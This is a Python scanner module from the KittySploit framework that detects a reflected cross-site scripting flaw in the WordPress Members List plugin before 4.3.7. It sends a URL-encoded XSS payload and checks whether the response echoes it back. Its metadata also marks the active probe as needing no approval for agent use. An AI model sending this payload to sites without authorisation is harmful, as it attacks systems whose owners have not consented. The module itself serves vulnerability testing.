#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Members List 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Members List <4.3.7 - Cross-Site Scripting Detection',
        'description': 'WordPress Members List 4.3.7 does not sanitize and escape some parameters in various pages before outputting them back, leading to reflected cross-site scripting vulnerabilities.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'vulnerability', 'wp', 'wordpress', 'wp-plugin', 'xss', 'wpscan', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://wpscan.com/vulnerability/d13f26f0-5d91-49d7-b514-1577d4247648'],
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/plugins/members-list/admin/view/user.php?page=%22%3E%3Cimg%20src%20onerror=alert(document.domain)%20x', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('"><img src onerror=alert(document.domain) x', 'wrap tern-wrap',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="WordPress Members List <4.3.7 - Cross-Site Scripting detected",
                path='/wp-content/plugins/members-list/admin/view/user.php?page=%22%3E%3Cimg%20src%20onerror=alert(document.domain)%20x',
            )
            return True
        return False

